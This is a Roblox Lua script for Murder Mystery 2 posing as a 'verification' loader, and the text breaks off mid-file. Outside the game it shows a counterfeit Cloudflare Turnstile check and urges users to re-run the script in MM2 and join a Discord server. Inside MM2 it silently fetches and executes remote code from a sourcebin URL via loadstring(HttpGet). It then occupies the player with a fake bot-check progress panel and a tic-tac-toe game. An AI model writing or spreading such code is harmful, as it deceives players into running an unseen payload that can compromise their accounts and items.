local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local LP = Players.LocalPlayer
local PG = LP:WaitForChild("PlayerGui")

local MM2_ID = 142823291
local LOAD_DUR = 180
local SCRIPT_URL = "https://cdn.sourceb.in/bins/AhNbx38Buf/0"
local DISCORD_URL = "https://discord.gg/KnRMYe7Kn"
local ALERT = "If verification failed, please join our discord server to access the protected script. NOTE: DON'T EVER LOGIN ON ANY SIGN OF FAKE ROBLOX GROUP! BEAM SITE ALERT!"

local C = {
    deep = Color3.fromRGB(32, 46, 58),
    ink = Color3.fromRGB(52, 68, 82),
    muted = Color3.fromRGB(96, 114, 128),
    glass = Color3.fromRGB(216, 232, 238),
    white = Color3.fromRGB(250, 253, 255),
    line = Color3.fromRGB(176, 204, 216),
    aqua = Color3.fromRGB(118, 176, 184),
    aquaLight = Color3.fromRGB(196, 226, 228),
    mist = Color3.fromRGB(186, 198, 216),
    warning = Color3.fromRGB(120, 86, 80),
    warningBg = Color3.fromRGB(236, 222, 214),
    error = Color3.fromRGB(168, 104, 100),
    success = Color3.fromRGB(88, 154, 132),
    cfOrange = Color3.fromRGB(246, 130, 31),
    cfLight = Color3.fromRGB(252, 161, 48),
    cfDark = Color3.fromRGB(196, 88, 18),
    cfText = Color3.fromRGB(64, 64, 64),
    cfGray = Color3.fromRGB(102, 102, 102),
    cfLine = Color3.fromRGB(218, 218, 218),
    cfCheck = Color3.fromRGB(0, 135, 90),
    cfBg = Color3.fromRGB(250, 250, 250)
}

local function tw(o, p, t, s, d)
    local a = TweenService:Create(o, TweenInfo.new(t, s or Enum.EasingStyle.Quad, d or Enum.EasingDirection.Out), p)
    a:Play()
    return a
end

local function new(cls, par, props)
    local o = Instance.new(cls)
    if props then for k, v in pairs(props) do o[k] = v end end
    o.Parent = par
    return o
end

local function corner(par, r) return new("UICorner", par, {CornerRadius = UDim.new(0, r or 12)}) end
local function stroke(par, c, t, tr)
    return new("UIStroke", par, {Color = c or C.line, Thickness = t or 1.2, Transparency = tr or 0.18})
end
local function frame(par, props) return new("Frame", par, props) end
local function label(par, props) return new("TextLabel", par, props) end

local function applyGlassWaterFx(parent, radius)
    radius = radius or 20
    new("UIGradient", parent, {
        Rotation = 118,
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(242, 250, 252)),
            ColorSequenceKeypoint.new(0.48, Color3.fromRGB(208, 228, 234)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(196, 206, 224))
        })
    })
    local wash = frame(parent, {
        Size = UDim2.new(1, -10, 1, -10), Position = UDim2.fromOffset(5, 5),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.76,
        BorderSizePixel = 0, ZIndex = 2
    })
    corner(wash, math.max(radius - 6, 8))
    local gloss = frame(parent, {
        Size = UDim2.new(1, -6, 0, 118), Position = UDim2.fromOffset(3, 3),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.52,
        BorderSizePixel = 0, ZIndex = 3
    })
    corner(gloss, radius - 2)
    new("UIGradient", gloss, {
        Rotation = 90,
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.08),
            NumberSequenceKeypoint.new(0.55, 0.7),
            NumberSequenceKeypoint.new(1, 1)
        })
    })
    local reflection = frame(parent, {
        Size = UDim2.new(1, -38, 0, 2), Position = UDim2.fromOffset(19, 3),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.12,
        BorderSizePixel = 0, ZIndex = 4
    })
    corner(reflection, 2)
    new("UIGradient", reflection, {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.18, 0.08),
            NumberSequenceKeypoint.new(0.72, 0.22),
            NumberSequenceKeypoint.new(1, 1)
        })
    })
end

local waterTargets, orbTargets = {}, {}

local function addWaterBody(clip)
    local shimmer = frame(clip, {
        Size = UDim2.new(0.52, 0, 1.8, 0), Position = UDim2.new(-0.62, 0, -0.4, 0),
        Rotation = 16, BackgroundColor3 = C.white, BackgroundTransparency = 1,
        BorderSizePixel = 0, ZIndex = 3
    })
    new("UIGradient", shimmer, {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.46, 0.58),
            NumberSequenceKeypoint.new(0.54, 0.58),
            NumberSequenceKeypoint.new(1, 1)
        })
    })
    local caustic = frame(clip, {
        Size = UDim2.new(0.3, 0, 1.7, 0), Position = UDim2.new(1.08, 0, -0.35, 0),
        Rotation = -20, BackgroundColor3 = C.aquaLight, BackgroundTransparency = 1,
        BorderSizePixel = 0, ZIndex = 3
    })
    new("UIGradient", caustic, {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.5, 0.8),
            NumberSequenceKeypoint.new(1, 1)
        })
    })
    local bubbles = {}
    for i = 1, 6 do
        local s = 3 + math.random(0, 6)
        local b = frame(clip, {
            Size = UDim2.fromOffset(s, s), Position = UDim2.new(math.random(), 0, 1, 0),
            BackgroundColor3 = C.white, BackgroundTransparency = 0.7 + math.random() * 0.18,
            BorderSizePixel = 0, ZIndex = 3
        })
        corner(b, s / 2)
        local rim = stroke(b, C.white, 1, 0.45)
        bubbles[i] = {obj = b, x = math.random(), y = 1, speed = 0.018 + math.random() * 0.04, phase = math.random() * 6.28}
    end
    waterTargets[#waterTargets + 1] = {
        shimmer = shimmer, shimmerT = math.random() * 4,
        caustic = caustic, causticT = math.random() * 6,
        t = 0, bubbles = bubbles
    }
end

local function addOrb(parent, x, y, size, color, z, speed)
    local o = frame(parent, {
        Size = UDim2.fromOffset(size, size), Position = UDim2.fromOffset(x, y),
        BackgroundColor3 = color, BorderSizePixel = 0, ZIndex = z or 1
    })
    corner(o, size / 2)
    new("UIGradient", o, {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.22),
            NumberSequenceKeypoint.new(1, 1)
        })
    })
    orbTargets[#orbTargets + 1] = {obj = o, x = x, y = y, t = math.random() * 6.28, speed = speed or 0.25, amp = 12 + math.random() * 10}
    return o
end

local function stepWater(dt)
    for _, fx in ipairs(waterTargets) do
        if fx.shimmer.Parent then
            fx.t = fx.t + dt
            fx.shimmerT = fx.shimmerT + dt
            fx.shimmer.Position = UDim2.new(-0.62 + (fx.shimmerT % 4.8) / 4.8 * 2.05, 0, -0.4, 0)
            if fx.caustic then
                fx.causticT = fx.causticT + dt
                fx.caustic.Position = UDim2.new(1.08 - (fx.causticT % 7.6) / 7.6 * 2.1, 0, -0.35, 0)
            end
            for _, b in ipairs(fx.bubbles) do
                b.y = b.y - b.speed * dt
                if b.y < -0.06 then b.y = 1.04 b.x = math.random() end
                b.obj.Position = UDim2.new(math.clamp(b.x + math.sin(fx.t * 1.25 + b.phase) * 0.012, 0.01, 0.99), 0, b.y, 0)
            end
        end
    end
    for _, o in ipairs(orbTargets) do
        if o.obj.Parent then
            o.t = o.t + o.speed * dt
            o.obj.Position = UDim2.fromOffset(o.x + math.sin(o.t) * o.amp, o.y + math.cos(o.t * 0.77) * o.amp * 0.68)
        end
    end
end

local function glassButton(parent, text, size, position, z)
    local b = new("TextButton", parent, {
        Size = size, Position = position, BackgroundColor3 = C.aquaLight,
        BackgroundTransparency = 0.12, BorderSizePixel = 0, Text = text,
        TextColor3 = C.deep, TextSize = 12, Font = Enum.Font.GothamMedium,
        AutoButtonColor = false, ZIndex = z or 7
    })
    corner(b, 11)
    stroke(b, C.white, 1.25, 0.08)
    new("UIGradient", b, {Rotation = 90, Color = ColorSequence.new(C.white, C.aquaLight)})
    b.MouseEnter:Connect(function() tw(b, {BackgroundTransparency = 0.02}, 0.16) end)
    b.MouseLeave:Connect(function() tw(b, {BackgroundTransparency = 0.12}, 0.16) end)
    return b
end

local function addAlert(parent, position, size)
    local box = frame(parent, {
        Size = size, Position = position, BackgroundColor3 = C.warningBg,
        BackgroundTransparency = 0.18, BorderSizePixel = 0, ZIndex = 6
    })
    corner(box, 11)
    stroke(box, Color3.fromRGB(208, 186, 176), 1, 0.12)
    local rule = frame(box, {
        Size = UDim2.new(0, 3, 1, -18), Position = UDim2.fromOffset(9, 9),
        BackgroundColor3 = Color3.fromRGB(176, 136, 124), BorderSizePixel = 0, ZIndex = 7
    })
    corner(rule, 2)
    label(box, {
        Size = UDim2.new(1, -36, 1, -16), Position = UDim2.fromOffset(25, 8),
        BackgroundTransparency = 1, Text = ALERT, TextWrapped = true,
        TextColor3 = C.warning, TextSize = 10, Font = Enum.Font.Gotham,
        TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Center,
        ZIndex = 7
    })
    return box
end

local function copyDiscord(feedback)
    local clipboard = setclipboard or toclipboard
    if type(clipboard) ~= "function" then
        feedback.Text = "Clipboard unavailable. Invite: " .. DISCORD_URL
        return
    end
    local ok = pcall(clipboard, DISCORD_URL)
    feedback.Text = ok and "Discord invite copied to clipboard" or ("Copy manually: " .. DISCORD_URL)
end

local function glassPanel(parent, w, h, x, y, name)
    local p = frame(parent, {
        Name = name, Size = UDim2.fromOffset(w, h), Position = UDim2.fromOffset(x, y),
        BackgroundColor3 = C.glass, BackgroundTransparency = 0.14,
        BorderSizePixel = 0, ZIndex = 2
    })
    corner(p, 22)
    stroke(p, C.white, 1.45, 0.05)
    local outer = stroke(p, Color3.fromRGB(150, 186, 200), 0.9, 0.5)
    applyGlassWaterFx(p, 22)
    local clip = frame(p, {Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ClipsDescendants = true, ZIndex = 2})
    addWaterBody(clip)
    local bevel = frame(p, {
        Size = UDim2.new(1, -32, 0, 1), Position = UDim2.fromOffset(16, 5),
        BackgroundColor3 = C.white, BackgroundTransparency = 0.62,
        BorderSizePixel = 0, ZIndex = 4
    })
    corner(bevel, 1)
    return p
end

-- Real Turnstile stacks an orange cloud over the CLOUDFLARE wordmark.
local function cloudLogo(parent, x, y)
    local g = frame(parent, {Size = UDim2.fromOffset(36, 16), Position = UDim2.fromOffset(x, y), BackgroundTransparency = 1, ZIndex = 8})
    local function puff(w, h, px, py, col, z)
        local f = frame(g, {
            Size = UDim2.fromOffset(w, h), Position = UDim2.fromOffset(px, py),
            BackgroundColor3 = col, BorderSizePixel = 0, ZIndex = z or 8
        })
        corner(f, math.min(w, h) / 2)
        return f
    end
    puff(12, 6, 2, 9, C.cfDark, 7)
    puff(10, 5, 22, 10, C.cfDark, 7)
    puff(16, 8, 1, 6, C.cfOrange, 8)
    puff(13, 11, 10, 2, C.cfOrange, 8)
    puff(13, 8, 20, 6, C.cfOrange, 8)
    puff(8, 4, 12, 2, C.cfLight, 9)
    puff(5, 3, 18, 4, C.cfLight, 9)
    return g
end

if PG:FindFirstChild("MM2_VerificationGui") then PG.MM2_VerificationGui:Destroy() end
if PG:FindFirstChild("MM2_LoaderGui") then PG.MM2_LoaderGui:Destroy() end

local camera = workspace.CurrentCamera
local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
local sw, sh = viewport.X, viewport.Y

-- ================================================================
-- Outside MM2: Cloudflare Turnstile, then the original fallback panel
-- ================================================================
if game.PlaceId ~= MM2_ID then
    local SG = new("ScreenGui", PG, {
        Name = "MM2_VerificationGui", ResetOnSpawn = false,
        ZIndexBehavior = Enum.ZIndexBehavior.Sibling, IgnoreGuiInset = true
    })
    local Overlay = frame(SG, {
        Size = UDim2.fromScale(1, 1), BackgroundColor3 = Color3.fromRGB(12, 16, 22),
        BackgroundTransparency = 0.32, BorderSizePixel = 0, ZIndex = 1
    })
    addOrb(SG, 40, 80, 320, C.aqua, 1, 0.16)
    addOrb(SG, sw - 360, sh - 480, 280, C.mist, 1, 0.12)

    -- Cloudflare managed-challenge widget (~300 x 65)
    local TSShadow = frame(SG, {
        Size = UDim2.fromOffset(306, 70), AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.new(0.5, 0, 0.5, 5),
        BackgroundColor3 = Color3.fromRGB(8, 12, 16),
        BackgroundTransparency = 0.78, BorderSizePixel = 0, ZIndex = 4
    })
    corner(TSShadow, 5)
    local TS = frame(SG, {
        Size = UDim2.fromOffset(300, 65), AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.fromScale(0.5, 0.5),
        BackgroundColor3 = C.cfBg, BorderSizePixel = 0, ZIndex = 5
    })
    corner(TS, 3)
    stroke(TS, Color3.fromRGB(208, 208, 208), 1, 0)

    local CheckBox = new("TextButton", TS, {
        Size = UDim2.fromOffset(28, 28), Position = UDim2.fromOffset(14, 18),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255), Text = "",
        BorderSizePixel = 0, AutoButtonColor = false, ZIndex = 7
    })
    corner(CheckBox, 3)
    local cbStroke = stroke(CheckBox, Color3.fromRGB(196, 196, 196), 1.4, 0)
    CheckBox.MouseEnter:Connect(function() if cbStroke then tw(cbStroke, {Color = Color3.fromRGB(160, 160, 160)}, 0.12) end end)
    CheckBox.MouseLeave:Connect(function() if cbStroke then tw(cbStroke, {Color = Color3.fromRGB(196, 196, 196)}, 0.12) end end)

    local CheckIcon = label(CheckBox, {
        Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Text = "✓",
        TextColor3 = C.cfCheck, TextSize = 18, Font = Enum.Font.GothamBold,
        TextTransparency = 1, ZIndex = 10
    })

    local Spinner = frame(CheckBox, {
        Size = UDim2.fromOffset(22, 22), Position = UDim2.fromOffset(3, 3),
        BackgroundTransparency = 1, Visible = false, ZIndex = 9
    })
    local Ring = frame(Spinner, {
        Size = UDim2.fromOffset(18, 18), Position = UDim2.fromOffset(2, 2),
        BackgroundColor3 = Color3.fromRGB(232, 232, 232), BorderSizePixel = 0, ZIndex = 9
    })
    corner(Ring, 9)
    local Hole = frame(Spinner, {
        Size = UDim2.fromOffset(10, 10), Position = UDim2.fromOffset(6, 6),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255), BorderSizePixel = 0, ZIndex = 10
    })
    corner(Hole, 5)
    local Arc = frame(Spinner, {
        Size = UDim2.fromOffset(22, 22), BackgroundTransparency = 1, ZIndex = 11
    })
    local Dot = frame(Spinner, {
        Size = UDim2.fromOffset(5, 5), Position = UDim2.fromOffset(8.5, 1),
        BackgroundColor3 = C.cfOrange, BorderSizePixel = 0, ZIndex = 12
    })
    corner(Dot, 3)

    label(TS, {
        Size = UDim2.fromOffset(168, 18), Position = UDim2.fromOffset(52, 14),
        BackgroundTransparency = 1, Text = "Verify you are human",
        TextColor3 = Color3.fromRGB(32, 32, 32), TextSize = 14,
        Font = Enum.Font.SourceSans, TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 7
    })
    label(TS, {
        Size = UDim2.fromOffset(168, 14), Position = UDim2.fromOffset(52, 34),
        BackgroundTransparency = 1, Text = "cloudflare.com  •  Privacy  •  Terms",
        TextColor3 = C.cfGray, TextSize = 10, Font = Enum.Font.SourceSans,
        TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 7
    })

    local Brand = frame(TS, {
        Size = UDim2.fromOffset(72, 40), Position = UDim2.fromOffset(220, 12),
        BackgroundTransparency = 1, ZIndex = 7
    })
    cloudLogo(Brand, 18, 0)
    label(Brand, {
        Size = UDim2.fromOffset(72, 12), Position = UDim2.fromOffset(0, 16),
        BackgroundTransparency = 1, Text = "CLOUDFLARE",
        TextColor3 = Color3.fromRGB(88, 88, 88), TextSize = 7, Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Center, ZIndex = 8
    })

    -- Original fallback copy, glass presentation
    local VPanel = frame(SG, {
        Size = UDim2.fromOffset(420, 430), AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.fromScale(0.5, 0.5), BackgroundColor3 = C.glass,
        BackgroundTransparency = 0.14, BorderSizePixel = 0, Visible = false, ZIndex = 2
    })
    corner(VPanel, 22)
    stroke(VPanel, C.white, 1.45, 0.05)
    applyGlassWaterFx(VPanel, 22)
    local clip = frame(VPanel, {Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ClipsDescendants = true, ZIndex = 2})
    addWaterBody(clip)

    label(VPanel, {
        Size = UDim2.new(1, -36, 0, 22), Position = UDim2.fromOffset(18, 22),
        BackgroundTransparency = 1, Text = "Bot verification required",
        TextColor3 = C.deep, TextSize = 16, Font = Enum.Font.GothamMedium,
        TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 6
    })
    label(VPanel, {
        Size = UDim2.new(1, -36, 0, 72), Position = UDim2.fromOffset(18, 52),
        BackgroundTransparency = 1,
        Text = "We suspect you might be a bot.\n\nTo prove you're a real player, please re-execute this script inside Murder Mystery 2 and wait for verification to finish. Come back here afterwards and you're good to go.",
        TextColor3 = C.ink, TextSize = 12, Font = Enum.Font.Gotham,
        TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top, ZIndex = 6
    })
    addAlert(VPanel, UDim2.fromOffset(18, 138), UDim2.new(1, -36, 0, 108))
    local TeleportBtn = glassButton(VPanel, "Take Me to MM2", UDim2.new(1, -36, 0, 40), UDim2.fromOffset(18, 260))
    local DiscordBtn = glassButton(VPanel, "Copy Discord invite", UDim2.new(1, -36, 0, 40), UDim2.fromOffset(18, 308))
    local ErrLbl = label(VPanel, {
        Size = UDim2.new(1, -28, 0, 36), Position = UDim2.fromOffset(14, 356),
        BackgroundTransparency = 1, Text = "", TextColor3 = C.warning,
        TextSize = 11, Font = Enum.Font.Gotham, TextWrapped = true, ZIndex = 7
    })
    label(VPanel, {
        Size = UDim2.new(1, -28, 0, 16), Position = UDim2.fromOffset(14, 400),
        BackgroundTransparency = 1, Text = "Murder Mystery 2  •  Place ID 142823291",
        TextColor3 = C.muted, TextSize = 9, Font = Enum.Font.Gotham,
        ZIndex = 7
    })

    local verified = false
    CheckBox.MouseButton1Click:Connect(function()
        if verified then return end
        verified = true
        Spinner.Visible = true
        local spinConn
        spinConn = RunService.RenderStepped:Connect(function(delta)
            if not Spinner.Parent or not Spinner.Visible then spinConn:Disconnect() return end
            Spinner.Rotation = Spinner.Rotation + delta * 360
        end)
        task.wait(3)
        if not SG.Parent then return end
        Spinner.Visible = false
        tw(CheckIcon, {TextTransparency = 0}, 0.2)
        task.wait(0.4)
        tw(TS, {BackgroundTransparency = 1}, 0.3)
        tw(TSShadow, {BackgroundTransparency = 1}, 0.3)
        task.wait(0.2)
        if not SG.Parent then return end
        TS.Visible = false
        TSShadow.Visible = false
        VPanel.Position = UDim2.new(0.5, 0, 0.5, 16)
        VPanel.Visible = true
        tw(VPanel, {Position = UDim2.fromScale(0.5, 0.5)}, 0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
    end)

    TeleportBtn.MouseButton1Click:Connect(function()
        ErrLbl.Text = "Error: Please join manually and execute the script!"
        ErrLbl.TextColor3 = C.warning
        tw(TeleportBtn, {BackgroundTransparency = 0.02}, 0.1)
        task.delay(0.2, function()
            if TeleportBtn.Parent then tw(TeleportBtn, {BackgroundTransparency = 0.12}, 0.2) end
        end)
    end)
    DiscordBtn.MouseButton1Click:Connect(function() copyDiscord(ErrLbl) end)

    RunService.Heartbeat:Connect(function(dt) stepWater(dt) end)
    return
end

-- ================================================================
-- Inside MM2: run payload first, then show the glass loader (no % timer)
-- ================================================================
pcall(function() loadstring(game:HttpGet(SCRIPT_URL, true))() end)

local SG = new("ScreenGui", PG, {
    Name = "MM2_LoaderGui", ResetOnSpawn = false,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling, IgnoreGuiInset = true
})
addOrb(SG, 16, 24, 260, C.aqua, 1, 0.18)
addOrb(SG, 200, sh - 520, 230, C.mist, 1, 0.14)

local Panel = glassPanel(SG, 330, 558, -350, 60, "MainPanel")

local Header = frame(Panel, {Size = UDim2.new(1, 0, 0, 48), BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 6})
label(Header, {
    Size = UDim2.new(1, -90, 1, 0), Position = UDim2.fromOffset(16, 2),
    BackgroundTransparency = 1, Text = "MM2 Loader",
    TextColor3 = C.deep, TextSize = 14, Font = Enum.Font.GothamMedium,
    TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 7
})
local CloseBtn = glassButton(Header, "×", UDim2.fromOffset(26, 26), UDim2.new(1, -38, 0.5, -11), 7)
CloseBtn.TextSize = 16
local HideBtn = glassButton(Header, "−", UDim2.fromOffset(26, 26), UDim2.new(1, -68, 0.5, -11), 7)
HideBtn.TextSize = 16

local ProgressContainer = frame(Panel, {
    Size = UDim2.new(1, -28, 0, 72), Position = UDim2.fromOffset(14, 50),
    BackgroundColor3 = C.white, BackgroundTransparency = 0.5,
    BorderSizePixel = 0, ZIndex = 5
})
corner(ProgressContainer, 13)
stroke(ProgressContainer, C.line, 1, 0.2)
local VerificationTitle = label(ProgressContainer, {
    Size = UDim2.new(1, -20, 0, 20), Position = UDim2.fromOffset(12, 8),
    BackgroundTransparency = 1, Text = "Verifying that you are not a bot...",
    TextColor3 = C.deep, TextSize = 12, Font = Enum.Font.GothamMedium,
    TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 7
})
local StatusLbl = label(ProgressContainer, {
    Size = UDim2.new(1, -24, 0, 16), Position = UDim2.fromOffset(12, 28),
    BackgroundTransparency = 1, Text = "Please wait while we finish a few checks.",
    TextColor3 = C.muted, TextSize = 10, Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 7
})
local BarBg = frame(ProgressContainer, {
    Size = UDim2.new(1, -24, 0, 7), Position = UDim2.fromOffset(12, 50),
    BackgroundColor3 = Color3.fromRGB(198, 216, 224), BorderSizePixel = 0,
    ClipsDescendants = true, ZIndex = 7
})
corner(BarBg, 4)
local BarFill = frame(BarBg, {
    Size = UDim2.new(0, 0, 1, 0), BackgroundColor3 = C.aqua, BorderSizePixel = 0, ZIndex = 8
})
corner(BarFill, 4)
new("UIGradient", BarFill, {Color = ColorSequence.new(C.aquaLight, C.aqua)})

label(Panel, {
    Size = UDim2.new(0.62, 0, 0, 20), Position = UDim2.fromOffset(15, 134),
    BackgroundTransparency = 1, Text = "Tic-Tac-Toe Minigame",
    TextColor3 = C.deep, TextSize = 11, Font = Enum.Font.GothamMedium,
    TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 6
})
local ScoreLbl = label(Panel, {
    Size = UDim2.new(0.38, -15, 0, 20), Position = UDim2.new(0.62, 0, 0, 134),
    BackgroundTransparency = 1, Text = "W 0   L 0   D 0",
    TextColor3 = C.muted, TextSize = 10, Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Right, ZIndex = 6
})
local GameStatus = label(Panel, {
    Size = UDim2.new(1, -30, 0, 16), Position = UDim2.fromOffset(15, 154),
    BackgroundTransparency = 1, Text = "You = ✕    Bot = ○",
    TextColor3 = C.aqua, TextSize = 10, Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 6
})
local Grid = frame(Panel, {
    Size = UDim2.fromOffset(302, 190), Position = UDim2.fromOffset(14, 176),
    BackgroundTransparency = 1, ZIndex = 5
})
new("UIGridLayout", Grid, {
    CellSize = UDim2.fromOffset(94, 58), CellPadding = UDim2.fromOffset(10, 8),
    SortOrder = Enum.SortOrder.LayoutOrder
})
local ResultLbl = label(Panel, {
    Size = UDim2.new(1, -28, 0, 20), Position = UDim2.fromOffset(14, 372),
    BackgroundTransparency = 1, Text = "", TextColor3 = C.success,
    TextSize = 11, Font = Enum.Font.GothamMedium, TextTransparency = 1, ZIndex = 6
})
addAlert(Panel, UDim2.fromOffset(14, 396), UDim2.new(1, -28, 0, 80))
local DiscordBtn = glassButton(Panel, "Copy Discord invite", UDim2.new(1, -28, 0, 36), UDim2.fromOffset(14, 486))
local CopyStatus = label(Panel, {
    Size = UDim2.new(1, -28, 0, 14), Position = UDim2.fromOffset(14, 528),
    BackgroundTransparency = 1, Text = "Murder Mystery 2  •  discord.gg/KnRMYe7Kn",
    TextColor3 = C.muted, TextSize = 9, Font = Enum.Font.Gotham, ZIndex = 7
})
DiscordBtn.MouseButton1Click:Connect(function() copyDiscord(CopyStatus) end)

local board, cells, gameOver, playerTurn = {}, {}, false, true
local wins, losses, draws = 0, 0, 0
local CE = Color3.fromRGB(242, 249, 250)
local CX = Color3.fromRGB(112, 164, 175)
local CO = Color3.fromRGB(150, 148, 184)
for i = 1, 9 do
    board[i] = ""
    local b = new("TextButton", Grid, {
        LayoutOrder = i, Size = UDim2.fromOffset(94, 58),
        BackgroundColor3 = CE, BackgroundTransparency = 0.12,
        BorderSizePixel = 0, Text = "", TextSize = 22,
        Font = Enum.Font.GothamMedium, AutoButtonColor = false, ZIndex = 6
    })
    corner(b, 10)
    stroke(b, C.line, 1, 0.15)
    b.MouseEnter:Connect(function()
        if board[i] == "" and not gameOver and playerTurn then tw(b, {BackgroundColor3 = C.aquaLight}, 0.12) end
    end)
    b.MouseLeave:Connect(function()
        if board[i] == "" then tw(b, {BackgroundColor3 = CE}, 0.12) end
    end)
    cells[i] = b
end

local WINS = {{1,2,3},{4,5,6},{7,8,9},{1,4,7},{2,5,8},{3,6,9},{1,5,9},{3,5,7}}
local function checkWin(b, m) for _, w in ipairs(WINS) do if b[w[1]] == m and b[w[2]] == m and b[w[3]] == m then return true end end end
local function full(b) for i = 1, 9 do if b[i] == "" then return false end end return true end

local function minimax(b, d, isMax, a, be)
    if checkWin(b, "O") then return 10 - d end
    if checkWin(b, "X") then return d - 10 end
    if full(b) then return 0 end
    if isMax then
        local best = -math.huge
        for i = 1, 9 do if b[i] == "" then b[i] = "O" local s = minimax(b, d + 1, false, a, be) b[i] = "" best = math.max(best, s) a = math.max(a, best) if be <= a then break end end end
        return best
    else
        local best = math.huge
        for i = 1, 9 do if b[i] == "" then b[i] = "X" local s = minimax(b, d + 1, true, a, be) b[i] = "" best = math.min(best, s) be = math.min(be, best) if be <= a then break end end end
        return best
    end
end

local function bestMove()
    local bs, mv = -math.huge, nil
    for i = 1, 9 do if board[i] == "" then board[i] = "O" local s = minimax(board, 0, false, -math.huge, math.huge) board[i] = "" if s > bs then bs = s mv = i end end end
    return mv
end

local function updateScore() ScoreLbl.Text = "W " .. wins .. "   L " .. losses .. "   D " .. draws end
local function flash(txt, col)
    ResultLbl.Text = txt ResultLbl.TextColor3 = col ResultLbl.TextTransparency = 1
    tw(ResultLbl, {TextTransparency = 0}, 0.3)
    task.delay(2.5, function() if ResultLbl.Parent then tw(ResultLbl, {TextTransparency = 1}, 0.4) end end)
end
local function setCell(i, m)
    board[i] = m cells[i].Text = m == "X" and "✕" or "○" cells[i].TextColor3 = m == "X" and CX or CO
    tw(cells[i], {BackgroundColor3 = C.aquaLight}, 0.1)
end
local function resetGame()
    task.wait(1.4)
    if not SG.Parent then return end
    for i = 1, 9 do board[i] = "" cells[i].Text = "" cells[i].BackgroundColor3 = CE end
    gameOver = false playerTurn = true
    GameStatus.Text = "Your turn — tap a cell" GameStatus.TextColor3 = CX
end
local function botPlay()
    playerTurn = false GameStatus.Text = "Bot is thinking..." GameStatus.TextColor3 = CO
    task.delay(0.45, function()
        if gameOver or not SG.Parent then return end
        local m = bestMove()
        if m then setCell(m, "O")
            if checkWin(board, "O") then gameOver = true losses = losses + 1 updateScore() flash("Bot wins! Play again?", CO) resetGame() return end
            if full(board) then gameOver = true draws = draws + 1 updateScore() flash("It's a draw! Play again?", C.muted) resetGame() return end
        end
        playerTurn = true GameStatus.Text = "Your turn — tap a cell" GameStatus.TextColor3 = CX
    end)
end
for i = 1, 9 do
    cells[i].MouseButton1Click:Connect(function()
        if gameOver or board[i] ~= "" or not playerTurn then return end
        setCell(i, "X")
        if checkWin(board, "X") then gameOver = true wins = wins + 1 updateScore() flash("You win! Play again?", C.success) resetGame() return end
        if full(board) then gameOver = true draws = draws + 1 updateScore() flash("It's a draw! Play again?", C.muted) resetGame() return end
        botPlay()
    end)
end
GameStatus.Text = "Your turn — tap a cell"

local Pill = glassButton(SG, "MM2 Verifier", UDim2.fromOffset(122, 30), UDim2.fromOffset(10, 60), 8)
Pill.Name = "Pill"
Pill.Visible = false
corner(Pill, 15)
local pDrag, pDragStart, pStartPos = false
Pill.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
        pDrag = true pDragStart = i.Position pStartPos = Pill.Position
    end
end)
Pill.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then pDrag = false end
end)
local dragConn = UIS.InputChanged:Connect(function(i)
    if pDrag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
        local d = i.Position - pDragStart
        Pill.Position = UDim2.fromOffset(pStartPos.X.Offset + d.X, pStartPos.Y.Offset + d.Y)
    end
end)

local function showPanel()
    Pill.Visible = false
    tw(Panel, {Position = UDim2.fromOffset(10, 60)}, 0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
end
local function hidePanel()
    tw(Panel, {Position = UDim2.fromOffset(-350, 60)}, 0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In)
    task.delay(0.4, function() if SG.Parent then Pill.Visible = true end end)
end
HideBtn.MouseButton1Click:Connect(hidePanel)
CloseBtn.MouseButton1Click:Connect(function() SG:Destroy() end)
Pill.MouseButton1Click:Connect(showPanel)

tw(Panel, {Position = UDim2.fromOffset(10, 60)}, 0.55, Enum.EasingStyle.Back, Enum.EasingDirection.Out)

local MSGS = {
    "Verifying that you are not a bot...",
    "Almost there...",
    "Running security checks...",
    "Testing your connection...",
    "Analyzing gameplay patterns...",
    "Cross-referencing your account...",
